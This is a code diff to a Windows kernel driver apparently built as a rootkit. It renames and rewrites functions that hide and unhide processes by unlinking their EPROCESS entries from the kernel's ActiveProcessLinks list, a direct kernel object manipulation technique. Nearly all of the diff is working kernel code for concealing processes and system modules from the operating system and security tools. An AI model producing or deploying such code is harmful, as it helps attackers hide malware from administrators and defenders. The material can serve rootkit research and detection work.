@@ -47,7 +47,7 @@ NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICO
 }
 
 
-NTSTATUS process::HideProcess(ULONG64 ProcessId, BOOL IsStrict) {
+NTSTATUS process::DKHideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 	// Assumes: PID is validated and not 0 in the entry to this function
 	PACTEPROCESS CurrentProcess = NULL;
 	LIST_ENTRY* CurrentList = NULL;
@@ -61,7 +61,6 @@ NTSTATUS process::HideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 	NextList = CurrentList->Flink;
 
 	while (CurrentList != NULL) {
-		DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Current PID = %llu\n", (ULONG64)CurrentProcess->UniqueProcessId);
 		if ((ULONG64)CurrentProcess->UniqueProcessId == ProcessId) {
 			PreviousList->Flink = NextList;  // Also works for cases when NextList is NULL
 			if (NextList != NULL) {
@@ -88,37 +87,46 @@ NTSTATUS process::HideProcess(ULONG64 ProcessId, BOOL IsStrict) {
 }
 
 
-NTSTATUS process::UnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
+NTSTATUS process::DKUnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
 	// Assumes: PID is validated and not 0 in the entry to this function
 	PACTEPROCESS CurrentProcess = NULL;
-	PACTEPROCESS UnhideProcess = NULL;
+	PACTEPROCESS UnhiddenProcess = NULL;
 	PACTEPROCESS PreviousProcess = NULL;
 	LIST_ENTRY* CurrentList = NULL;
 	LIST_ENTRY* PreviousList = NULL;
 	LIST_ENTRY* NextList = NULL;
-	if (HiddenIndex != 0) {
+
+	if (ProcessId == REMOVE_BY_INDEX_PID) {
 		if (HiddenIndex >= ProcessHide.HiddenCount) {
 			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed - index over hidden count (%lu >= %lu)\n", ProcessId, HiddenIndex, ProcessHide.HiddenCount);
 			return STATUS_INVALID_PARAMETER;
 		}
-		if (!ProcessHide.RemoveFromHidden(ProcessId, HiddenIndex, (PEPROCESS*)(&UnhideProcess))) {
+		if (!ProcessHide.RemoveFromHidden(ProcessId, HiddenIndex, (PEPROCESS*)(&UnhiddenProcess))) {
 			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed, index based\n", ProcessId);
 			return STATUS_UNSUCCESSFUL;
 		}
 	}
-	else {
-		if (!ProcessHide.RemoveFromHidden(ProcessId, ProcessHide.HiddenCount, (PEPROCESS*)(&UnhideProcess))) {
-			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed, PID based\n", ProcessId);
-			return STATUS_UNSUCCESSFUL;
-		}
+	else if (!ProcessHide.RemoveFromHidden(ProcessId, ProcessHide.HiddenCount, (PEPROCESS*)(&UnhiddenProcess))) {
+		DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed, PID based\n", ProcessId);
+		return STATUS_UNSUCCESSFUL;
 	}
+
 	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
 	PreviousList = &CurrentProcess->ActiveProcessLinks;
 	CurrentList = PreviousList->Flink;
 	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
 	NextList = CurrentList->Flink;
+
 	while (CurrentList != NULL) {
-		// Iterate until the list finishes to add the unhidden process:
+		if ((ULONG64)CurrentProcess->UniqueProcessId > (ULONG64)UnhiddenProcess->UniqueProcessId) {
+			PreviousProcess = (PACTEPROCESS)((ULONG64)PreviousList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
+			(&UnhiddenProcess->ActiveProcessLinks)->Flink = CurrentList;
+			PreviousList->Flink = &UnhiddenProcess->ActiveProcessLinks;
+			(&UnhiddenProcess->ActiveProcessLinks)->Blink = PreviousList;
+			CurrentList->Blink = &CurrentProcess->ActiveProcessLinks;
+			DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Found unhide placement for process %llu between process %llu and process %llu\n", (ULONG64)UnhiddenProcess->UniqueProcessId, (ULONG64)PreviousProcess->UniqueProcessId, (ULONG64)CurrentProcess->UniqueProcessId);
+			return STATUS_SUCCESS;
+		}
 		PreviousList = CurrentList;
 		CurrentList = NextList;
 		if (CurrentList != NULL) {
@@ -126,16 +134,12 @@ NTSTATUS process::UnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
 			CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
 		}
 	}
-	PreviousList->Flink = &UnhideProcess->ActiveProcessLinks;
-	(&UnhideProcess->ActiveProcessLinks)->Blink = PreviousList;
-	(&UnhideProcess->ActiveProcessLinks)->Flink = NULL;
-	PreviousProcess = (PACTEPROCESS)((ULONG64)PreviousList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
-	DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Found unhide placement for process %llu at the end (after %llu)\n", ProcessId, (ULONG64)PreviousProcess->UniqueProcessId);
-	return STATUS_SUCCESS;
+	DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Did not find place to hide process %llu\n", (ULONG64)UnhiddenProcess->UniqueProcessId);
+	return STATUS_NOT_FOUND;
 }
 
 
-NTSTATUS process::ListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress) {
+NTSTATUS process::DKListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress) {
 	PVOID EprocessList = NULL;
 	PACTEPROCESS CurrentProcessPointer = NULL;
 	ACTEPROCESS CurrentProcess = { 0 };
